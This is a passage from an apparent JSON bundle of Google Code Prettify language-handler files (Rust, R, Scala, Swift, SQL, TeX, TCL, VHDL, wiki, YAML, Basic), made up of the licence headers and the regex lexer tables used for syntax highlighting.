/^\\/\\/.*/], // Block comments (sadly I do not see how to make this cope with comment nesting as it should) [PR['PR_COMMENT'], /^\\/\\*[\\s\\S]*?(?:\\*\\/|$)/],//, null], // String and character literals [PR['PR_STRING'], /^b\"(?:[^\\\\]|\\\\(?:.|x[\\da-fA-F]{2}))*?\"/], // Bytes literal [PR['PR_STRING'], /^\"(?:[^\\\\]|\\\\(?:.|x[\\da-fA-F]{2}|u\\{\\[\\da-fA-F]{1,6}\\}))*?\"/], // String literal [PR['PR_STRING'], /^b?r(#*)\\\"[\\s\\S]*?\\\"\\1/], // Raw string/bytes literal [PR['PR_STRING'], /^b'([^\\\\]|\\\\(.|x[\\da-fA-F]{2}))'/], // Byte literal [PR['PR_STRING'], /^'([^\\\\]|\\\\(.|x[\\da-fA-F]{2}|u\\{[\\da-fA-F]{1,6}\\}))'/], // Character literal // Lifetime [PR['PR_TAG'], /^'\\w+?\\b/], // Keywords, reserved keywords and primitive types [PR['PR_KEYWORD'], /^(?:match|if|else|as|break|box|continue|extern|fn|for|in|if|impl|let|loop|pub|return|super|unsafe|where|while|use|mod|trait|struct|enum|type|move|mut|ref|static|const|crate)\\b/], [PR['PR_KEYWORD'], /^(?:alignof|become|do|offsetof|priv|pure|sizeof|typeof|unsized|yield|abstract|virtual|final|override|macro)\\b/], [PR['PR_TYPE'], /^(?:[iu](8|16|32|64|128|size)|char|bool|f32|f64|str|Self)\\b/], // Rust 1.0 prelude items [PR['PR_TYPE'], /^(?:Copy|Send|Sized|Sync|Drop|Fn|FnMut|FnOnce|Box|ToOwned|Clone|PartialEq|PartialOrd|Eq|Ord|AsRef|AsMut|Into|From|Default|Iterator|Extend|IntoIterator|DoubleEndedIterator|ExactSizeIterator|Option|Some|None|Result|Ok|Err|SliceConcatExt|String|ToString|Vec)\\b/], // Literals: [PR['PR_LITERAL'], /^(self|true|false|null)\\b/], // A number is a hex integer literal, a decimal real literal, or in // scientific notation. // Integer literals: decimal, hexadecimal, octal, binary. [PR['PR_LITERAL'], /^\\d[0-9_]*(?:[iu](?:size|8|16|32|64|128))?/], [PR['PR_LITERAL'], /^0x[a-fA-F0-9_]+(?:[iu](?:size|8|16|32|64|128))?/], [PR['PR_LITERAL'], /^0o[0-7_]+(?:[iu](?:size|8|16|32|64|128))?/], [PR['PR_LITERAL'], /^0b[01_]+(?:[iu](?:size|8|16|32|64|128))?/], // Float literals [PR['PR_LITERAL'], /^\\d[0-9_]*\\.(?![^\\s\\d.])/], [PR['PR_LITERAL'], /^\\d[0-9_]*(?:\\.\\d[0-9_]*)(?:[eE][+-]?[0-9_]+)?(?:f32|f64)?/], [PR['PR_LITERAL'], /^\\d[0-9_]*(?:\\.\\d[0-9_]*)?(?:[eE][+-]?[0-9_]+)(?:f32|f64)?/], [PR['PR_LITERAL'], /^\\d[0-9_]*(?:\\.\\d[0-9_]*)?(?:[eE][+-]?[0-9_]+)?(?:f32|f64)/], // Macro invocations (an identifier plus a !) [PR['PR_ATTRIB_NAME'], /^[a-z_]\\w*!/i], // An identifier (sorry, this should be unicode) [PR['PR_PLAIN'], /^[a-z_]\\w*/i], // Attributes [PR['PR_ATTRIB_VALUE'], /^#!?\\[[\\s\\S]*?\\]/], // All the punctuation [PR['PR_PUNCTUATION'], /^[+\\-/*=^&|!%[\\](){}?:.,;]/], // Anything else (which is probably illegal, as all the legal stuff should have been covered) can be plain [PR['PR_PLAIN'], /./] ]), ['rust']);","path":"plugins/prettify/lang-rust.js"},{"title":"","text":"/** * @license * Copyright (C) 2012 Jeffrey B. Arnold * * Licensed under the Apache License, Version 2.0 (the \"License\"); * you may not use this file except in compliance with the License. * You may obtain a copy of the License at * * http://www.apache.org/licenses/LICENSE-2.0 * * Unless required by applicable law or agreed to in writing, software * distributed under the License is distributed on an \"AS IS\" BASIS, * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. * See the License for the specific language governing permissions and * limitations under the License. */ /** * @fileoverview * Registers a language handler for S, S-plus, and R source code. * * * To use, include prettify.js and this file in your HTML page. * Then put your code in an HTML tag like * code * * Language definition from * http://cran.r-project.org/doc/manuals/R-lang.html. * Many of the regexes are shared with the pygments SLexer, * http://pygments.org/. * * Original: https://raw.github.com/jrnold/prettify-lang-r-bugs/master/lang-r.js * * @author jeffrey.arnold@gmail.com */ PR['registerLangHandler']( PR['createSimpleLexer']( [ [PR['PR_PLAIN'], /^[\\t\\n\\r \\xA0]+/, null, '\\t\\n\\r \\xA0'], [PR['PR_STRING'], /^\\\"(?:[^\\\"\\\\]|\\\\[\\s\\S])*(?:\\\"|$)/, null, '\"'], [PR['PR_STRING'], /^\\'(?:[^\\'\\\\]|\\\\[\\s\\S])*(?:\\'|$)/, null, \"'\"] ], [ [PR['PR_COMMENT'], /^#.*/], [PR['PR_KEYWORD'], /^(?:if|else|for|while|repeat|in|next|break|return|switch|function)(?![A-Za-z0-9_.])/], // hex numbes [PR['PR_LITERAL'], /^0[xX][a-fA-F0-9]+([pP][0-9]+)?[Li]?/], // Decimal numbers [PR['PR_LITERAL'], /^[+-]?([0-9]+(\\.[0-9]+)?|\\.[0-9]+)([eE][+-]?[0-9]+)?[Li]?/], // builtin symbols [PR['PR_LITERAL'], /^(?:NULL|NA(?:_(?:integer|real|complex|character)_)?|Inf|TRUE|FALSE|NaN|\\.\\.(?:\\.|[0-9]+))(?![A-Za-z0-9_.])/], // assignment, operators, and parens, etc. [PR['PR_PUNCTUATION'], /^(?:?|-|==|=||&&?|!=|\\|\\|?|\\*|\\+|\\^|\\/|!|%.*?%|=|~|\\$|@|:{1,3}|[\\[\\](){};,?])/], // valid variable names [PR['PR_PLAIN'], /^(?:[A-Za-z]+[A-Za-z0-9_.]*|\\.[a-zA-Z_][0-9a-zA-Z\\._]*)(?![A-Za-z0-9_.])/], // string backtick [PR['PR_STRING'], /^`.+`/] ]), ['r', 's', 'R', 'S', 'Splus']);","path":"plugins/prettify/lang-r.js"},{"title":"","text":"/** * @license * Copyright (C) 2010 Google Inc. * * Licensed under the Apache License, Version 2.0 (the \"License\"); * you may not use this file except in compliance with the License. * You may obtain a copy of the License at * * http://www.apache.org/licenses/LICENSE-2.0 * * Unless required by applicable law or agreed to in writing, software * distributed under the License is distributed on an \"AS IS\" BASIS, * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. * See the License for the specific language governing permissions and * limitations under the License. */ /** * @fileoverview * Registers a language handler for Scala. * * Derived from http://lampsvn.epfl.ch/svn-repos/scala/scala-documentation/trunk/src/reference/SyntaxSummary.tex * * @author mikesamuel@gmail.com */ PR['registerLangHandler']( PR['createSimpleLexer']( [ // Whitespace [PR['PR_PLAIN'], /^[\\t\\n\\r \\xA0]+/, null, '\\t\\n\\r \\xA0'], // A double or single quoted string // or a triple double-quoted multi-line string. [PR['PR_STRING'], /^(?:\"(?:(?:\"\"(?:\"\"?(?!\")|[^\\\\\"]|\\\\.)*\"{0,3})|(?:[^\"\\r\\n\\\\]|\\\\.)*\"?))/, null, '\"'], [PR['PR_LITERAL'], /^`(?:[^\\r\\n\\\\`]|\\\\.)*`?/, null, '`'], [PR['PR_PUNCTUATION'], /^[!#%&()*+,\\-:;?@\\[\\\\\\]^{|}~]+/, null, '!#%&()*+,-:;?@[\\\\]^{|}~'] ], [ // A symbol literal is a single quote followed by an identifier with no // single quote following // A character literal has single quotes on either side [PR['PR_STRING'], /^'(?:[^\\r\\n\\\\']|\\\\(?:'|[^\\r\\n']+))'/], [PR['PR_LITERAL'], /^'[a-zA-Z_$][\\w$]*(?!['$\\w])/], [PR['PR_KEYWORD'], /^(?:abstract|case|catch|class|def|do|else|extends|final|finally|for|forSome|if|implicit|import|lazy|match|new|object|override|package|private|protected|requires|return|sealed|super|throw|trait|try|type|val|var|while|with|yield)\\b/], [PR['PR_LITERAL'], /^(?:true|false|null|this)\\b/], [PR['PR_LITERAL'], /^(?:(?:0(?:[0-7]+|X[0-9A-F]+))L?|(?:(?:0|[1-9][0-9]*)(?:(?:\\.[0-9]+)?(?:E[+\\-]?[0-9]+)?F?|L?))|\\\\.[0-9]+(?:E[+\\-]?[0-9]+)?F?)/i], // Treat upper camel case identifiers as types. [PR['PR_TYPE'], /^[$_]*[A-Z][_$A-Z0-9]*[a-z][\\w$]*/], [PR['PR_PLAIN'], /^[$a-zA-Z_][\\w$]*/], [PR['PR_COMMENT'], /^\\/(?:\\/.*|\\*(?:\\/|\\**[^*/])*(?:\\*+\\/?)?)/], [PR['PR_PUNCTUATION'], /^(?:\\.+|\\/)/] ]), ['scala']);","path":"plugins/prettify/lang-scala.js"},{"title":"","text":"/** * @license * Copyright (C) 2015 Google Inc. * * Licensed under the Apache License, Version 2.0 (the \"License\"); * you may not use this file except in compliance with the License. * You may obtain a copy of the License at * * http://www.apache.org/licenses/LICENSE-2.0 * * Unless required by applicable law or agreed to in writing, software * distributed under the License is distributed on an \"AS IS\" BASIS, * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. * See the License for the specific language governing permissions and * limitations under the License. */ /** * @fileoverview * Registers a language handler for Swift * * * To use, include prettify.js and this file in your HTML page. * Then put your code in an HTML tag like * (my swift code) * This file supports the following language extensions: * lang-swift - Swift * * I used https://developer.apple.com/library/ios/documentation/Swift/Conceptual/Swift_Programming_Language/AboutTheLanguageReference.html * as the source of truth for this. The revision from 2015-10-21 (Swift 2.1) was used in most recent update. * * @author cerech@google.com */ PR['registerLangHandler']( PR['createSimpleLexer']( [ //whitespace [PR['PR_PLAIN'], /^[ \\n\\r\\t\\v\\f\\0]+/, null, ' \\n\\r\\t\\v\\f\\0'], //string literals [PR['PR_STRING'], /^\"(?:[^\"\\\\]|(?:\\\\.)|(?:\\\\\\((?:[^\"\\\\)]|\\\\.)*\\)))*\"/, null, '\"'] ], [ //floating point literals [PR['PR_LITERAL'], /^(?:(?:0x[\\da-fA-F][\\da-fA-F_]*\\.[\\da-fA-F][\\da-fA-F_]*[pP]?)|(?:\\d[\\d_]*\\.\\d[\\d_]*[eE]?))[+-]?\\d[\\d_]*/, null], //integer literals [PR['PR_LITERAL'], /^-?(?:(?:0(?:(?:b[01][01_]*)|(?:o[0-7][0-7_]*)|(?:x[\\da-fA-F][\\da-fA-F_]*)))|(?:\\d[\\d_]*))/, null], //some other literals [PR['PR_LITERAL'], /^(?:_|Any|true|false|nil)\\b/, null], //keywords [PR['PR_KEYWORD'], /^\\b(?:__COLUMN__|__FILE__|__FUNCTION__|__LINE__|#available|#colorLiteral|#column|#else|#elseif|#endif|#file|#fileLiteral|#function|#if|#imageLiteral|#line|#selector|#sourceLocation|arch|arm|arm64|associatedtype|associativity|as|break|case|catch|class|continue|convenience|default|defer|deinit|didSet|do|dynamic|dynamicType|else|enum|extension|fallthrough|fileprivate|final|for|func|get|guard|import|indirect|infix|init|inout|internal|i386|if|in|iOS|iOSApplicationExtension|is|lazy|left|let|mutating|none|nonmutating|open|operator|optional|OSX|OSXApplicationExtension|override|postfix|precedence|prefix|private|protocol|Protocol|public|repeat|required|rethrows|return|right|safe|Self|self|set|static|struct|subscript|super|switch|throw|throws|try|Type|typealias|unowned|unsafe|var|weak|watchOS|where|while|willSet|x86_64)\\b/, null], //double slash comments [PR['PR_COMMENT'], /^\\/\\/.*?[\\n\\r]/, null], //slash star comments [PR['PR_COMMENT'], /^\\/\\*[\\s\\S]*?(?:\\*\\/|$)/, null], //punctuation [PR['PR_PUNCTUATION'], /^|===|==|\\.\\.\\.|&&=|\\.\\.|`|==|\\+\\+|--|\\/|\\+|!|\\*|%||&|\\||\\^|\\?|=|-|_/, null], [PR['PR_TYPE'], /^\\b(?:[@_]?[A-Z]+[a-z][A-Za-z_$@0-9]*|\\w+_t\\b)/, null] //borrowing the type regex given by the main program for C-family languages ]), ['swift']);","path":"plugins/prettify/lang-swift.js"},{"title":"","text":"/** * @license * Copyright (C) 2008 Google Inc. * * Licensed under the Apache License, Version 2.0 (the \"License\"); * you may not use this file except in compliance with the License. * You may obtain a copy of the License at * * http://www.apache.org/licenses/LICENSE-2.0 * * Unless required by applicable law or agreed to in writing, software * distributed under the License is distributed on an \"AS IS\" BASIS, * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. * See the License for the specific language governing permissions and * limitations under the License. */ /** * @fileoverview * Registers a language handler for SQL. * * * To use, include prettify.js and this file in your HTML page. * Then put your code in an HTML tag like * (my SQL code) * * * http://savage.net.au/SQL/sql-99.bnf.html is the basis for the grammar, and * http://msdn.microsoft.com/en-us/library/aa238507(SQL.80).aspx and * http://meta.stackoverflow.com/q/92352/137403 as the bases for the keyword * list. * * @author mikesamuel@gmail.com */ PR['registerLangHandler']( PR['createSimpleLexer']( [ // Whitespace [PR['PR_PLAIN'], /^[\\t\\n\\r \\xA0]+/, null, '\\t\\n\\r \\xA0'], // A double or single quoted, possibly multi-line, string. [PR['PR_STRING'], /^(?:\"(?:[^\\\"\\\\]|\\\\.)*\"|'(?:[^\\'\\\\]|\\\\.)*')/, null, '\"\\''] ], [ // A comment is either a line comment that starts with two dashes, or // two dashes preceding a long bracketed block. [PR['PR_COMMENT'], /^(?:--[^\\r\\n]*|\\/\\*[\\s\\S]*?(?:\\*\\/|$))/], [PR['PR_KEYWORD'], /^(?:ADD|ALL|ALTER|AND|ANY|APPLY|AS|ASC|AUTHORIZATION|BACKUP|BEGIN|BETWEEN|BREAK|BROWSE|BULK|BY|CASCADE|CASE|CHECK|CHECKPOINT|CLOSE|CLUSTERED|COALESCE|COLLATE|COLUMN|COMMIT|COMPUTE|CONNECT|CONSTRAINT|CONTAINS|CONTAINSTABLE|CONTINUE|CONVERT|CREATE|CROSS|CURRENT|CURRENT_DATE|CURRENT_TIME|CURRENT_TIMESTAMP|CURRENT_USER|CURSOR|DATABASE|DBCC|DEALLOCATE|DECLARE|DEFAULT|DELETE|DENY|DESC|DISK|DISTINCT|DISTRIBUTED|DOUBLE|DROP|DUMMY|DUMP|ELSE|END|ERRLVL|ESCAPE|EXCEPT|EXEC|EXECUTE|EXISTS|EXIT|FETCH|FILE|FILLFACTOR|FOLLOWING|FOR|FOREIGN|FREETEXT|FREETEXTTABLE|FROM|FULL|FUNCTION|GOTO|GRANT|GROUP|HAVING|HOLDLOCK|IDENTITY|IDENTITYCOL|IDENTITY_INSERT|IF|IN|INDEX|INNER|INSERT|INTERSECT|INTO|IS|JOIN|KEY|KILL|LEFT|LIKE|LINENO|LOAD|MATCH|MATCHED|MERGE|NATURAL|NATIONAL|NOCHECK|NONCLUSTERED|NOCYCLE|NOT|NULL|NULLIF|OF|OFF|OFFSETS|ON|OPEN|OPENDATASOURCE|OPENQUERY|OPENROWSET|OPENXML|OPTION|OR|ORDER|OUTER|OVER|PARTITION|PERCENT|PIVOT|PLAN|PRECEDING|PRECISION|PRIMARY|PRINT|PROC|PROCEDURE|PUBLIC|RAISERROR|READ|READTEXT|RECONFIGURE|REFERENCES|REPLICATION|RESTORE|RESTRICT|RETURN|REVOKE|RIGHT|ROLLBACK|ROWCOUNT|ROWGUIDCOL|ROWS?|RULE|SAVE|SCHEMA|SELECT|SESSION_USER|SET|SETUSER|SHUTDOWN|SOME|START|STATISTICS|SYSTEM_USER|TABLE|TEXTSIZE|THEN|TO|TOP|TRAN|TRANSACTION|TRIGGER|TRUNCATE|TSEQUAL|UNBOUNDED|UNION|UNIQUE|UNPIVOT|UPDATE|UPDATETEXT|USE|USER|USING|VALUES|VARYING|VIEW|WAITFOR|WHEN|WHERE|WHILE|WITH|WITHIN|WRITETEXT|XML)(?=[^\\w-]|$)/i, null], // A number is a hex integer literal, a decimal real literal, or in // scientific notation. [PR['PR_LITERAL'], /^[+-]?(?:0x[\\da-f]+|(?:(?:\\.\\d+|\\d+(?:\\.\\d*)?)(?:e[+\\-]?\\d+)?))/i], // An identifier [PR['PR_PLAIN'], /^[a-z_][\\w-]*/i], // A run of punctuation [PR['PR_PUNCTUATION'], /^[^\\w\\t\\n\\r \\xA0\\\"\\'][^\\w\\t\\n\\r \\xA0+\\-\\\"\\']*/] ]), ['sql']);","path":"plugins/prettify/lang-sql.js"},{"title":"","text":"/** * @license * Copyright (C) 2011 Martin S. * * Licensed under the Apache License, Version 2.0 (the \"License\"); * you may not use this file except in compliance with the License. * You may obtain a copy of the License at * * http://www.apache.org/licenses/LICENSE-2.0 * * Unless required by applicable law or agreed to in writing, software * distributed under the License is distributed on an \"AS IS\" BASIS, * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. * See the License for the specific language governing permissions and * limitations under the License. */ /** * @fileoverview * Support for tex highlighting as discussed on * meta.tex.stackexchange.com. * * @author Martin S. */ PR['registerLangHandler']( PR['createSimpleLexer']( [ // whitespace [PR['PR_PLAIN'], /^[\\t\\n\\r \\xA0]+/, null, '\\t\\n\\r \\xA0'], // all comments begin with '%' [PR['PR_COMMENT'], /^%[^\\r\\n]*/, null, '%'] ], [ //[PR['PR_DECLARATION'], /^\\\\([egx]?def|(new|renew|provide)(command|environment))\\b/], // any command starting with a \\ and contains // either only letters (a-z,A-Z), '@' (internal macros) [PR['PR_KEYWORD'], /^\\\\[a-zA-Z@]+/], // or contains only one character [PR['PR_KEYWORD'], /^\\\\./], // Highlight dollar for math mode and ampersam for tabular [PR['PR_TYPE'], /^[$&]/], // numeric measurement values with attached units [PR['PR_LITERAL'], /[+-]?(?:\\.\\d+|\\d+(?:\\.\\d*)?)(cm|em|ex|in|pc|pt|bp|mm)/i], // punctuation usually occurring within commands [PR['PR_PUNCTUATION'], /^[{}()\\[\\]=]+/] ]), ['latex', 'tex']);","path":"plugins/prettify/lang-tex.js"},{"title":"","text":"/** * @license * Copyright (C) 2012 Pyrios * * Licensed under the Apache License, Version 2.0 (the \"License\"); * you may not use this file except in compliance with the License. * You may obtain a copy of the License at * * http://www.apache.org/licenses/LICENSE-2.0 * * Unless required by applicable law or agreed to in writing, software * distributed under the License is distributed on an \"AS IS\" BASIS, * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. * See the License for the specific language governing permissions and * limitations under the License. */ /** * @fileoverview * Registers a language handler for TCL * * * To use, include prettify.js and this file in your HTML page. * Then put your code in an HTML tag like * proc foo {} {puts bar} * * I copy-pasted lang-lisp.js, so this is probably not 100% accurate. * I used http://wiki.tcl.tk/1019 for the keywords, but tried to only * include as keywords that had more impact on the program flow * rather than providing convenience. For example, I included 'if' * since that provides branching, but left off 'open' since that is more * like a proc. Add more if it makes sense. * * @author pyrios@gmail.com */ PR['registerLangHandler']( PR['createSimpleLexer']( [ ['opn', /^\\{+/, null, '{'], ['clo', /^\\}+/, null, '}'], // A line comment that starts with ; [PR['PR_COMMENT'], /^#[^\\r\\n]*/, null, '#'], // Whitespace [PR['PR_PLAIN'], /^[\\t\\n\\r \\xA0]+/, null, '\\t\\n\\r \\xA0'], // A double quoted, possibly multi-line, string. [PR['PR_STRING'], /^\\\"(?:[^\\\"\\\\]|\\\\[\\s\\S])*(?:\\\"|$)/, null, '\"'] ], [ [PR['PR_KEYWORD'], /^(?:after|append|apply|array|break|case|catch|continue|error|eval|exec|exit|expr|for|foreach|if|incr|info|proc|return|set|switch|trace|uplevel|upvar|while)\\b/, null], [PR['PR_LITERAL'], /^[+\\-]?(?:[0#]x[0-9a-f]+|\\d+\\/\\d+|(?:\\.\\d+|\\d+(?:\\.\\d*)?)(?:[ed][+\\-]?\\d+)?)/i], // A single quote possibly followed by a word that optionally ends with // = ! or ?. [PR['PR_LITERAL'], /^\\'(?:-*(?:\\w|\\\\[\\x21-\\x7e])(?:[\\w-]*|\\\\[\\x21-\\x7e])[=!?]?)?/], // A word that optionally ends with = ! or ?. [PR['PR_PLAIN'], /^-*(?:[a-z_]|\\\\[\\x21-\\x7e])(?:[\\w-]*|\\\\[\\x21-\\x7e])[=!?]?/i], // A printable non-space non-special character [PR['PR_PUNCTUATION'], /^[^\\w\\t\\n\\r \\xA0()\\\"\\\\\\';]+/] ]), ['tcl']);","path":"plugins/prettify/lang-tcl.js"},{"title":"","text":"/** * @license * Copyright (C) 2010 benoit@ryder.fr * * Licensed under the Apache License, Version 2.0 (the \"License\"); * you may not use this file except in compliance with the License. * You may obtain a copy of the License at * * http://www.apache.org/licenses/LICENSE-2.0 * * Unless required by applicable law or agreed to in writing, software * distributed under the License is distributed on an \"AS IS\" BASIS, * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. * See the License for the specific language governing permissions and * limitations under the License. */ /** * @fileoverview * Registers a language handler for VHDL '93. * * Based on the lexical grammar and keywords at * http://www.iis.ee.ethz.ch/~zimmi/download/vhdl93_syntax.html * * @author benoit@ryder.fr */ PR['registerLangHandler']( PR['createSimpleLexer']( [ // Whitespace [PR['PR_PLAIN'], /^[\\t\\n\\r \\xA0]+/, null, '\\t\\n\\r \\xA0'] ], [ // String, character or bit string [PR['PR_STRING'], /^(?:[BOX]?\"(?:[^\\\"]|\"\")*\"|'.')/i], // Comment, from two dashes until end of line. [PR['PR_COMMENT'], /^--[^\\r\\n]*/], [PR['PR_KEYWORD'], /^(?:abs|access|after|alias|all|and|architecture|array|assert|attribute|begin|block|body|buffer|bus|case|component|configuration|constant|disconnect|downto|else|elsif|end|entity|exit|file|for|function|generate|generic|group|guarded|if|impure|in|inertial|inout|is|label|library|linkage|literal|loop|map|mod|nand|new|next|nor|not|null|of|on|open|or|others|out|package|port|postponed|procedure|process|pure|range|record|register|reject|rem|report|return|rol|ror|select|severity|shared|signal|sla|sll|sra|srl|subtype|then|to|transport|type|unaffected|units|until|use|variable|wait|when|while|with|xnor|xor)(?=[^\\w-]|$)/i, null], // Type, predefined or standard [PR['PR_TYPE'], /^(?:bit|bit_vector|character|boolean|integer|real|time|string|severity_level|positive|natural|signed|unsigned|line|text|std_u?logic(?:_vector)?)(?=[^\\w-]|$)/i, null], // Predefined attributes [PR['PR_TYPE'], /^\\'(?:ACTIVE|ASCENDING|BASE|DELAYED|DRIVING|DRIVING_VALUE|EVENT|HIGH|IMAGE|INSTANCE_NAME|LAST_ACTIVE|LAST_EVENT|LAST_VALUE|LEFT|LEFTOF|LENGTH|LOW|PATH_NAME|POS|PRED|QUIET|RANGE|REVERSE_RANGE|RIGHT|RIGHTOF|SIMPLE_NAME|STABLE|SUCC|TRANSACTION|VAL|VALUE)(?=[^\\w-]|$)/i, null], // Number, decimal or based literal [PR['PR_LITERAL'], /^\\d+(?:_\\d+)*(?:#[\\w\\\\.]+#(?:[+\\-]?\\d+(?:_\\d+)*)?|(?:\\.\\d+(?:_\\d+)*)?(?:E[+\\-]?\\d+(?:_\\d+)*)?)/i], // Identifier, basic or extended [PR['PR_PLAIN'], /^(?:[a-z]\\w*|\\\\[^\\\\]*\\\\)/i], // Punctuation [PR['PR_PUNCTUATION'], /^[^\\w\\t\\n\\r \\xA0\\\"\\'][^\\w\\t\\n\\r \\xA0\\-\\\"\\']*/] ]), ['vhdl', 'vhd']);","path":"plugins/prettify/lang-vhdl.js"},{"title":"","text":"/** * @license * Copyright (C) 2009 Google Inc. * * Licensed under the Apache License, Version 2.0 (the \"License\"); * you may not use this file except in compliance with the License. * You may obtain a copy of the License at * * http://www.apache.org/licenses/LICENSE-2.0 * * Unless required by applicable law or agreed to in writing, software * distributed under the License is distributed on an \"AS IS\" BASIS, * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. * See the License for the specific language governing permissions and * limitations under the License. */ /** * @fileoverview * Registers a language handler for Wiki pages. * * Based on WikiSyntax at http://code.google.com/p/support/wiki/WikiSyntax * * @author mikesamuel@gmail.com */ PR['registerLangHandler']( PR['createSimpleLexer']( [ // Whitespace [PR['PR_PLAIN'], /^[\\t \\xA0a-gi-z0-9]+/, null, '\\t \\xA0abcdefgijklmnopqrstuvwxyz0123456789'], // Wiki formatting [PR['PR_PUNCTUATION'], /^[=*~\\^\\[\\]]+/, null, '=*~^[]'] ], [ // Meta-info like #summary, #labels, etc. ['lang-wiki.meta', /(?:^^|\\r\\n?|\\n)(#[a-z]+)\\b/], // A WikiWord [PR['PR_LITERAL'], /^(?:[A-Z][a-z][a-z0-9]+[A-Z][a-z][a-zA-Z0-9]+)\\b/ ], // A preformatted block in an unknown language ['lang-', /^\\{\\{\\{([\\s\\S]+?)\\}\\}\\}/], // A block of source code in an unknown language ['lang-', /^`([^\\r\\n`]+)`/], // An inline URL. [PR['PR_STRING'], /^https?:\\/\\/[^\\/?#\\s]*(?:\\/[^?#\\s]*)?(?:\\?[^#\\s]*)?(?:#\\S*)?/i], [PR['PR_PLAIN'], /^(?:\\r\\n|[\\s\\S])[^#=*~^A-Zh\\{`\\[\\r\\n]*/] ]), ['wiki']); PR['registerLangHandler']( PR['createSimpleLexer']([[PR['PR_KEYWORD'], /^#[a-z]+/i, null, '#']], []), ['wiki.meta']);","path":"plugins/prettify/lang-wiki.js"},{"title":"","text":"/** * @license * Copyright (C) 2015 ribrdb @ code.google.com * * Licensed under the Apache License, Version 2.0 (the \"License\"); * you may not use this file except in compliance with the License. * You may obtain a copy of the License at * * http://www.apache.org/licenses/LICENSE-2.0 * * Unless required by applicable law or agreed to in writing, software * distributed under the License is distributed on an \"AS IS\" BASIS, * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. * See the License for the specific language governing permissions and * limitations under the License. */ // Contributed by ribrdb @ code.google.com /** * @fileoverview * Registers a language handler for YAML. * * @author ribrdb */ PR['registerLangHandler']( PR['createSimpleLexer']( [ [PR['PR_PUNCTUATION'], /^[:|>?]+/, null, ':|>?'], [PR['PR_DECLARATION'], /^%(?:YAML|TAG)[^#\\r\\n]+/, null, '%'], [PR['PR_TYPE'], /^[&]\\S+/, null, '&'], [PR['PR_TYPE'], /^!\\S*/, null, '!'], [PR['PR_STRING'], /^\"(?:[^\\\\\"]|\\\\.)*(?:\"|$)/, null, '\"'], [PR['PR_STRING'], /^'(?:[^']|'')*(?:'|$)/, null, \"'\"], [PR['PR_COMMENT'], /^#[^\\r\\n]*/, null, '#'], [PR['PR_PLAIN'], /^\\s+/, null, ' \\t\\r\\n'] ], [ [PR['PR_DECLARATION'], /^(?:---|\\.\\.\\.)(?:[\\r\\n]|$)/], [PR['PR_PUNCTUATION'], /^-/], [PR['PR_KEYWORD'], /^[\\w-]+:[ \\r\\n]/], [PR['PR_PLAIN'], /^\\w+/] ]), ['yaml', 'yml']);","path":"plugins/prettify/lang-yaml.js"},{"title":"","text":"/** * @license * Copyright (C) 2009 Google Inc. * * Licensed under the Apache License, Version 2.0 (the \"License\"); * you may not use this file except in compliance with the License. * You may obtain a copy of the License at * * http://www.apache.org/licenses/LICENSE-2.0 * * Unless required by applicable law or agreed to in writing, software * distributed under the License is distributed on an \"AS IS\" BASIS, * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. * See the License for the specific language governing permissions and * limitations under the License. */ /** * @fileoverview * Registers a language handler for various flavors of basic. * * * To use, include prettify.js and this file in your HTML page. * Then put your code in an HTML tag like * * * * http://msdn.microsoft.com/en-us/library/aa711638(VS.71).aspx defines the * visual basic grammar lexical grammar. * * @author mikesamuel@gmail.com */ PR['registerLangHandler']( PR['createSimpleLexer']( [ // Whitespace [PR['PR_PLAIN'], /^[\\t\\n\\r \\xA0\\u2028\\u2029]+/, null, '\\t\\n\\r \\xA0\\u2028\\u2029'], // A double quoted string with quotes escaped by doubling them. // A single character can be suffixed with C. [PR['PR_STRING'], /^(?:[\\\"\\u201C\\u201D](?:[^\\\"\\u201C\\u201D]|[\\\"\\u201C\\u201D]{2})(?:[\\\"\\u201C\\u201D]c|$)|[\\\"\\u201C\\u201D](?:[^\\\"\\u201C\\u201D]|[\\\"\\u201C\\u201D]{2})*(?:[\\\"\\u201C\\u201D]|$))/i, null, '\"\\u201C\\u201D'], // A comment starts with a single quote and runs until the end of the // line. // VB6 apparently allows _ as an escape sequence for newlines though // this is not a documented feature of VB.net. // http://meta.stackoverflow.com/q/121497/137403 [PR['PR_COMMENT'], /^[\\'\\u2018\\u2019](?:_(?:\\r\\n?|[^\\r]?)|[^\\r\\n_\\u2028\\u2029])*/, null, '\\'\\u2018\\u2019'] ], [ [PR['PR_KEYWORD'], /^(?:AddHandler|AddressOf|Alias|And|AndAlso|Ansi|As|Assembly|Auto|Boolean|ByRef|Byte|ByVal|Call|Case|Catch|CBool|CByte|CChar|CDate|CDbl|CDec|Char|CInt|Class|CLng|CObj|Const|CShort|CSng|CStr|CType|Date|Decimal|Declare|Default|Delegate|Dim|DirectCast|Do|Double|Each|Else|ElseIf|End|EndIf|Enum|Erase|Error|Event|Exit|Finally|For|Friend|Function|Get|GetType|GoSub|GoTo|Handles|If|Implements|Imports|In|Inherits|Integer|Interface|Is|Let|Lib|Like|Long|Loop|Me|Mod|Module|MustInherit|MustOverride|MyBase|MyClass|Namespace|New|Next|Not|NotInheritable|NotOverridable|Object|On|Option|Optional|Or|OrElse|Overloads|Overridable|Overrides|ParamArray|Preserve|Private|Property|Protected|Public|RaiseEvent|ReadOnly|ReDim|RemoveHandler|Resume|Return|Select|Set|Shadows|Shared|Short|Single|Static|Step|Stop|String|Structure|Sub|SyncLock|Then|Throw|To|Try|TypeOf|Unicode|Until|Variant|Wend|When|While|With|WithEvents|WriteOnly|Xor|EndIf|GoSub|Let|Variant|Wend)\\b/i, null], // A second comment form [PR['PR_COMMENT'], /^REM\\b[^\\r\\n\\u2028\\u2029]*/i], // A boolean, numeric, or date literal. [PR['PR_LITERAL'], 